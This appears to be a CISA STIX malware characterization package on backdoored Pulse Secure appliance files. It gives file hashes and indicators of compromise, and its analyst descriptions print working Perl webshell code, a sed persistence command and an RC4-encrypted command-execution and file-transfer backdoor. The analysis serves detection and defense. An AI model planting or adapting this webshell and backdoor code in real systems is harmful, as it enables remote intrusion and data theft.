@@ -1,0 +1,702 @@
+<stix:STIX_Package 
+	xmlns:cyboxCommon="http://cybox.mitre.org/common-2"
+	xmlns:cybox="http://cybox.mitre.org/cybox-2"
+	xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2"
+	xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2"
+	xmlns:marking="http://data-marking.mitre.org/Marking-1"
+	xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1"
+	xmlns:TOUMarking="http://data-marking.mitre.org/extensions/MarkingStructure#Terms_Of_Use-1"
+	xmlns:maecBundle="http://maec.mitre.org/XMLSchema/maec-bundle-4"
+	xmlns:maecPackage="http://maec.mitre.org/XMLSchema/maec-package-2"
+	xmlns:maecVocabs="http://maec.mitre.org/default_vocabularies-1"
+	xmlns:incident="http://stix.mitre.org/Incident-1"
+	xmlns:indicator="http://stix.mitre.org/Indicator-2"
+	xmlns:ttp="http://stix.mitre.org/TTP-1"
+	xmlns:stixCommon="http://stix.mitre.org/common-1"
+	xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1"
+	xmlns:stix-maec="http://stix.mitre.org/extensions/Malware#MAEC4.1-1"
+	xmlns:stix="http://stix.mitre.org/stix-1"
+	xmlns:NCCIC="http://www.cisa.gov/"
+	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+	xsi:schemaLocation="
+	http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd
+	http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd
+	http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd
+	http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd
+	http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd
+	http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd
+	http://data-marking.mitre.org/extensions/MarkingStructure#Terms_Of_Use-1 http://stix.mitre.org/XMLSchema/extensions/marking/terms_of_use/1.0.1/terms_of_use_marking.xsd
+	http://maec.mitre.org/XMLSchema/maec-bundle-4 http://maec.mitre.org/language/version4.1/maec_bundle_schema.xsd
+	http://maec.mitre.org/XMLSchema/maec-package-2 http://maec.mitre.org/language/version4.1/maec_package_schema.xsd
+	http://maec.mitre.org/default_vocabularies-1 http://maec.mitre.org/language/version4.1/maec_default_vocabularies.xsd
+	http://stix.mitre.org/Incident-1 http://stix.mitre.org/XMLSchema/incident/1.1.1/incident.xsd
+	http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd
+	http://stix.mitre.org/TTP-1 http://stix.mitre.org/XMLSchema/ttp/1.1.1/ttp.xsd
+	http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd
+	http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd
+	http://stix.mitre.org/extensions/Malware#MAEC4.1-1 http://stix.mitre.org/XMLSchema/extensions/malware/maec_4.1/1.0.1/maec_4.1_malware.xsd
+	http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd" id="NCCIC:Package-8d0ecbaa-27f3-4142-979b-c25b26802349" version="1.1.1" timestamp="2021-07-14T10:48:15-04:00">
+    <stix:STIX_Header>
+        <stix:Title>MAR-10333243.r1.v1: Pulse Secure</stix:Title>
+        <stix:Package_Intent>Malware Characterization</stix:Package_Intent>
+        <stix:Handling>
+            <marking:Marking>
+                <marking:Controlled_Structure>//node() | //@*</marking:Controlled_Structure>
+                <marking:Marking_Structure xsi:type='tlpMarking:TLPMarkingStructureType' color="WHITE"/>
+                <marking:Marking_Structure xsi:type='TOUMarking:TermsOfUseMarkingStructureType'>
+                    <TOUMarking:Terms_Of_Use>This document is marked TLP:WHITE--Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol (TLP), see http://www.cisa.gov/tlp.</TOUMarking:Terms_Of_Use>
+                </marking:Marking_Structure>
+            </marking:Marking>
+        </stix:Handling>
+        <stix:Information_Source>
+            <stixCommon:Identity>
+                <stixCommon:Name>cisa</stixCommon:Name>
+            </stixCommon:Identity>
+            <stixCommon:Time>
+                <cyboxCommon:Produced_Time>2021-07-14T10:48:15-04:00</cyboxCommon:Produced_Time>
+            </stixCommon:Time>
+            <stixCommon:Tools>
+                <cyboxCommon:Tool>
+                    <cyboxCommon:Name>BMachine</cyboxCommon:Name>
+                    <cyboxCommon:Description>40</cyboxCommon:Description>
+                    <cyboxCommon:Version>7.1.0</cyboxCommon:Version>
+                </cyboxCommon:Tool>
+            </stixCommon:Tools>
+        </stix:Information_Source>
+    </stix:STIX_Header>
+    <stix:Observables cybox_major_version="2" cybox_minor_version="1" cybox_update_version="0">
+        <cybox:Observable id="NCCIC:Observable-2799ba95-e346-4186-87d7-de85a4834685">
+            <cybox:Description><![CDATA[The file contains malicious code that was patched into the Pulse Secure application. 
+
+--Begin Malicious Code--
+  my $cgi_p="/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi";
+  my $cmd_x="sed -i '/echo_console \"Saving package\"/i(sed -i \\\'/main();\\\$/cif(CGI::param(\\\\\"id\\\\\")){print \\\\\"Cache-Control: no-cache\\\\\\\\n\\\\\";print \\\\\"Content-type: text/html\\\\\\\\n\\\\\\\\n\\\\\";my \\\\\$na=CGI::param(\\\\\"id\\\\\");system(\\\\\"\\\\\$na\\\");}else{&main();}\\\' /tmp/data/root$cgi_p;cp -f /home/perl/DSUpgrade.pm /tmp/data/root/home/perl;cp -f /pkg/dspkginstall /tmp/data/root/pkg/;)' /pkg/do-install";
+  system("/bin/mount -o remount,rw /dev/root /");
+  system("/bin/tar", "-xzf", "/tmp/new-pack.tgz", "-C", "/tmp","./installer");
+  system("cp -f /tmp/installer/do-install /pkg/");
+  system("cp -f /tmp/installer/VERSION /pkg/");
+  system("cp -f /tmp/installer/sysboot-shlib /pkg/");
+  system("cp -f /tmp/installer/losetup /pkg/");
+  system("$cmd_x");
+  system("rm -rf /tmp/installer");
+  my $td =  time - $ts;
+  my $status = $? % 255;
+  if ($status == 0) {
+    print $html " complete ($td seconds)</li>";
+    print $console " complete\r\n";
+  }
+  else {
+    print $html " failed</li>";
+    print $console " failed\r\n";
+  }
+  
+
+  return $status == 0;
+}
+--End Malicious Code--
+
+The patched in code will leverage the following SED command to patch a malicious webshell into the Pulse Secure system file “/pkg/do-install”:
+
+--Begin Malicious SED Command--
+ my $cmd_x="sed -i '/echo_console \"Saving package\"/i(sed -i \\\'/main();\\\$/cif(CGI::param(\\\\\"id\\\\\")){print \\\\\"Cache-Control: no-cache\\\\\\\\n\\\\\";print \\\\\"Content-type: text/html\\\\\\\\n\\\\\\\\n\\\\\";my \\\\\$na=CGI::param(\\\\\"id\\\\\");system(\\\\\"\\\\\$na\\\");}else{&main();}\\\' /tmp/data/root$cgi_p;cp -f /home/perl/DSUpgrade.pm /tmp/data/root/home/perl;cp -f /pkg/dspkginstall /tmp/data/root/pkg/;)' /pkg/do-install"
+--End Malicious SED Command--
+
+The purpose of the webshell is to accept a parameter named "id" from within an incoming web application post, and also copy another instance of the shell into the parameter '$cgi_p', which resolves to the legitimate file 'licenseserverproto.cgi'. The webshell will then process the data provided within the "id" parameter as an operating system command by executing it locally utilizing the system() function.]]></cybox:Description>
+            <cybox:Object id="NCCIC:File-f55a890f-0056-4579-ac3e-f255c74b2b12">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:File_Name>DSUpgrade.pm</FileObj:File_Name>
+                    <FileObj:Size_In_Bytes>5270</FileObj:Size_In_Bytes>
+                    <FileObj:File_Format>Perl5 module source, ASCII text, with very long lines</FileObj:File_Format>
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>d855ebd2adeaf2b3c87b28e77e9ce4d4</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>1e43bc7cde1c2ac7b0db7b74b3be47334171d410</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>a3b60b4bc4a5c7af525491ba37b570f90405aa83e36655da7d91bd68acaedf85</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA512</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>d94795f11c04862b054d2f83babca034c20bfd00c2c0abe1e1fcfdb3854924a0d9944d0f168147060311d948b1bb194f27eaa491563e7b00ba58e776a4a6f676</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>96:FYIFAu1JZtGm4OcAHgDfX27AF1K2dsvWlgzP5Ft8gb16rJ2yXp6uIvWZlGMQbvek:eIB1XcTfX20Dds+gF3Ar8yXp6uIyUMQB</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                    <FileObj:Peak_Entropy>5.03176</FileObj:Peak_Entropy>
+                </cybox:Properties>
+                <cybox:Related_Objects>
+                    <cybox:Related_Object idref="NCCIC:File-88c12d8d-2527-4586-8f50-7cb1c7b08777">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Related_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                </cybox:Related_Objects>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-e900cfcf-e883-43fd-ac8f-429816cb9199">
+            <cybox:Description><![CDATA[This artifact is a Pulse Secure CGI application that has been modified with the following malicious webshell:
+
+---Begin Malicious Webshell---
+if(CGI::param("id")){print "Cache-Control: no-cache\n";print "Content-type: text/html\n\n";my $na=CGI::param("id");system("$na");}else{&main();}
+---End Malicious Webshell---
+
+The webshell is designed to perform an initial check to determine whether data was passed into the web application within a parameter named "id". If this parameter is provided, the code will extract its contents and execute it on the target system using the system() function. If no "id" parameter is passed to the application the code will simply execute the main() function of the original Pulse Secure application.]]></cybox:Description>
+            <cybox:Object id="NCCIC:File-88c12d8d-2527-4586-8f50-7cb1c7b08777">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:File_Name>licenseserverproto.cgi</FileObj:File_Name>
+                    <FileObj:Size_In_Bytes>2105</FileObj:Size_In_Bytes>
+                    <FileObj:File_Format>Perl script text executable</FileObj:File_Format>
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>e50edf64239b84be02ee5902c22ab336</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>1f26ef302ebc881380aa227ddd8eaebdad54679f</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>d3982747d9b589ea20581b0448bddfd7c8a7cdad4760a99b4de762742833640a</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA512</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>9acee1c2ca0ca24b76c2caab545abaea65e390b6b1f9e058e405bb438ce95eb20a0c1a10512f0b594ebab6dd5f8c0d5228eb3bcf0f8ba1a0f0a35fb0d3410eef</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>48:ECLYmeAJAZo1BuswT4o7oo7vpBBBQWBZ7zSH72BZ7TtH7CN4/to7jH7XH76bejBv:E4YkJAZfv/wO27Y0</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                    <FileObj:Peak_Entropy>5.119005</FileObj:Peak_Entropy>
+                </cybox:Properties>
+                <cybox:Related_Objects>
+                    <cybox:Related_Object idref="NCCIC:File-f55a890f-0056-4579-ac3e-f255c74b2b12">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Related_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                </cybox:Related_Objects>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-3c501507-00c2-489b-ac5e-860091abfd4c">
+            <cybox:Description><![CDATA[This artifact is a Pulse Secure CGI script that has been maliciously modified. The modification allows for remote command execution and uploads and downloads of encrypted files. The malicious code is displayed below. Analyst comments are in brackets []:
+
+---Begin Malicious Code---
+use MIME::Base64;
+use Crypt::RC4;
+
+my $ph="[REDACTED]"; [Hard coded RC4 key.]
+
+sub r  [Generates random bytes to be used in (sub a) for encryption.]
+{
+  my $n=$_[0];
+  my $rs;
+    for (my $i=0;$i<$n;$i++)
+    {
+    my $n1=int(rand(256));
+    $rs.=chr($n1);
+    }
+  return $rs;
+}
+
+sub a  [RC4 encrypts a string that includes a random 6 byte key, RC4 key ($ph above), and the payload, then base64 encodes the string.]
+{
+  my $st=$_[0];
+  my $k=r(6);
+  my $en = RC4( $k.$ph, $st);
+  return encode_base64($k.$en);
+}
+
+sub b [Base64 decodes a payload and then decodes using the above RC4 key ($ph) and 6 byte key.]
+{
+  my $s= decode_base64($_[0]); 
+  my $l=length($s);
+  my $k= substr($s,0,6);
+  my $en=substr($s,6,$l-6);
+  my $de = RC4( $k.$ph, $en );
+  return $de;
+}
+
+sub c [Downloads a file and uses the (sub b) function above to decrypt it, or uploads a file and uses the (sub a) function above to encrypt it.]
+
+{
+  my $fi=CGI::param('img');
+  my $FN=b($fi);
+  my $fd;
+  print "Content-type: application/x-download\n";
+  open(*FILE, "<$FN" );
+    while(<FILE>)
+    {
+      $fd=$fd.$_;
+    }
+  close(*FILE);
+  print "Content-Disposition: attachment; 
+  filename=tmp\n\n";
+  print a($fd);
+}
+
+sub d  [Decrypts a file using the (sub b) function above and writes out the file.]
+{
+  print "Cache-Control: no-cache\n";
+  print "Content-type: text/html\n\n";
+  my $fi = CGI::param('cert');
+  $fi=b($fi);
+  my $pa=CGI::param('md5');
+  $pa=b($pa);
+  open (*outfile, ">$pa");
+  print outfile $fi;
+  close (*outfile);
+}
+
+sub e  [Decrypts an incoming command and executes as system. If the command has the wrong parameter it returns "Error 404".]
+{
+  print "Cache-Control: no-cache\n";
+  print "Content-type: image/gif\n\n";
+  my $na=CGI::param('name');
+  $na=b($na);my $rt;
+    if (!$na or $na eq "cd") 
+    {
+      $rt="Error 404";
+    }
+      else 
+    {
+    my $ot="/tmp/1";
+    system("$na >/tmp/1 2>&1");
+    open(*cmd_result,"<$ot");
+      while(<cmd_result>)
+      {
+        $rt=$rt.$_;
+      }
+    close(*cmd_result);
+    unlink $ot}  print a($rt);
+}
+
+  sub f  [Responses to POST requests.]
+{
+  if(CGI::param('cert'))  [If it receives a file it attempts to write it.]
+  {
+    d();
+  }
+  elsif(CGI::param('img') and CGI::param('name'))  [If it receives a command it attempts to execute it.]
+  {
+    c();
+  }
+  elsif(CGI::param('name') and CGI::param('img') eq "") [If it is unable to execute the command it sends "Error 404".]
+  {
+    e();
+  }
+  else # [Do normal processing.]
+  {
+     &main();
+  }
+}
+if ($ENV{'REQUEST_METHOD'} eq "POST")   [If its a POST request follow (sub f) function above.]
+{
+  f();
+}
+else
+{
+  &main(); [Do normal processing.]
+}
+---End Malicious Code---
+
+
+The last part of this file contains modified code that renders a dialog box that allows for the searching of files to be downloaded. Before downloading, the files are RC4 encrypted and base64 encoded. The program uses the hard-coded key for the RC4 encryption.]]></cybox:Description>
+            <cybox:Object id="NCCIC:File-e0506417-6bb3-4822-aa94-f6c39951c657">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:File_Name>healthcheck.cgi</FileObj:File_Name>
+                    <FileObj:Size_In_Bytes>9272</FileObj:Size_In_Bytes>
+                    <FileObj:File_Format>Perl script text executable</FileObj:File_Format>
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>f23e94a38f0a93df46ba83786f3180e0</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>2f1eddf6af9284f6b6c0a8b14fc3e5986ee601c7</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>ec3dc5a11b66c5b3ab006ac786914de674e50d0b08c6f6d0cfe7247dbe67a496</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA512</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>ec6b5f25ccdf9a251ff8ba10086820c4cf841e1d487f242edf1f6d7b1b2437f6b2fd12b80989c80a008fb5e7469713971afb39703df7ee556df24669a3124e0d</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>192:5zwJNuIYj7rcCOk1QrhMeWyOUV9AWojcZiOQiQsfinnoK9Cih1pa+7yi3hm:5zwJwrXWOUV9AWojoiOujQ</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                    <FileObj:Peak_Entropy>5.114695</FileObj:Peak_Entropy>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-27596cc4-1ebf-4a71-a7d7-778c5001b297">
+            <cybox:Description><![CDATA[This artifact is a Pulse Secure CGI application that has been modified with the following malicious webshell:
+
+---Begin Malicious Webshell---
+if(CGI::param("id")){print "Cache-Control: no-cache\n";print "Content-type: text/html\n\n";my $na=CGI::param("id");system("$na");}else{&main();}
+---End Malicious Webshell---
+
+The webshell is designed to perform an initial check to determine whether data was passed into the web application within a parameter named "id". If this parameter is provided, the code will extract its contents and execute it on the target system using the system() function. If no "id" parameter is passed to the application, the code will simply execute the main() function of the original Pulse Secure application.]]></cybox:Description>
+            <cybox:Object id="NCCIC:File-b206cd1c-7fa7-4535-ae2d-177b26232765">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:File_Name> licenseserverproto.cgi </FileObj:File_Name>
+                    <FileObj:Size_In_Bytes>2104</FileObj:Size_In_Bytes>
+                    <FileObj:File_Format>Perl script text executable</FileObj:File_Format>
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>a0ce730cffc65e6950c6a5d1d2de0ebb</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>620bfbc94296271c3c6d71b97a8b5486d63347b3</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>bef423bd85a25d14ffa511a0e04194e59b283057bd41689d473f79d227942c98</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA512</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>c2102a112e7fd41cda15fbab438b6b849e072beaaf0650d209fb9b4350e260cb3a611eac3acf9f2aa6c8ce9be071aed1362db7619f14d94990d00cada4256b77</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value>48:E1LYmeAJAZo1BuswT4o7oo7vpBBBQWBZ7zSH72BZ7TtH7CN4/to7jH7XH76bejBv:EJYkJAZfv/wO27Y0</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                    <FileObj:Peak_Entropy>5.12004</FileObj:Peak_Entropy>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+    </stix:Observables>
+    <stix:Indicators>
+        <stix:Indicator id="NCCIC:indicator-ba0edbfc-5b48-4cb2-9292-7ee3d60ac23b" timestamp="2021-07-14T16:34:39.836577+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>MD5 and SHA1 of Malicious File</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-f9e0c306-6b4c-4afe-9e1b-da2f32cfcf7c">
+                <cybox:Object id="NCCIC:File-d73a702b-0289-47c3-9b7b-f2270e7150c8">
+                    <cybox:Properties xsi:type="FileObj:FileObjectType">
+                        <FileObj:Hashes>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">d855ebd2adeaf2b3c87b28e77e9ce4d4</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">1e43bc7cde1c2ac7b0db7b74b3be47334171d410</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">a3b60b4bc4a5c7af525491ba37b570f90405aa83e36655da7d91bd68acaedf85</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                        </FileObj:Hashes>
+                    </cybox:Properties>
+                </cybox:Object>
+            </indicator:Observable>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-a9204089-4440-4f76-988b-c6259b1bc0f1" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-b93b24b2-d9f0-4d81-8ad3-17c3a4ea466d" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-57ad48f8-1c81-437a-806e-a3c6defb3ddf" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>NCCIC</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2021-07-14T16:34:39+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-d979953a-c9d2-44cf-9551-bd0e0a5c46ea" timestamp="2021-07-14T16:34:39.943534+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>MD5 and SHA1 of Malicious File</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-0a5c9ac4-ac13-4809-9f21-48ffde417f30">
+                <cybox:Object id="NCCIC:File-936e323d-49cd-4aae-94cc-4c079e48a92e">
+                    <cybox:Properties xsi:type="FileObj:FileObjectType">
+                        <FileObj:Hashes>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">e50edf64239b84be02ee5902c22ab336</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">1f26ef302ebc881380aa227ddd8eaebdad54679f</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">d3982747d9b589ea20581b0448bddfd7c8a7cdad4760a99b4de762742833640a</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                        </FileObj:Hashes>
+                    </cybox:Properties>
+                </cybox:Object>
+            </indicator:Observable>
+            <indicator:Indicated_TTP>
+                <stixCommon:TTP idref="NCCIC:ttp-57ad48f8-1c81-437a-806e-a3c6defb3ddf" xsi:type='ttp:TTPType'/>
+            </indicator:Indicated_TTP>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>NCCIC</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2021-07-14T16:34:39+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-52177634-1ffa-49aa-979a-bb82a2167492" timestamp="2021-07-14T16:34:40.018201+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>MD5 and SHA1 of Malicious File</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-8696d58e-5f40-478d-b7be-faf954078d28">
+                <cybox:Object id="NCCIC:File-288a0bc2-887f-420d-8519-cca574bfa995">
+                    <cybox:Properties xsi:type="FileObj:FileObjectType">
+                        <FileObj:Hashes>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">f23e94a38f0a93df46ba83786f3180e0</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">2f1eddf6af9284f6b6c0a8b14fc3e5986ee601c7</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                            <cyboxCommon:Hash>
+                                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                                <cyboxCommon:Simple_Hash_Value condition="Equals">ec3dc5a11b66c5b3ab006ac786914de674e50d0b08c6f6d0cfe7247dbe67a496</cyboxCommon:Simple_Hash_Value>
+                            </cyboxCommon:Hash>
+                        </FileObj:Hashes>
+                    </cybox:Properties>
+                </cybox:Object>
+            </indicator:Observable>
+            <indicator:Indicated_TTP>
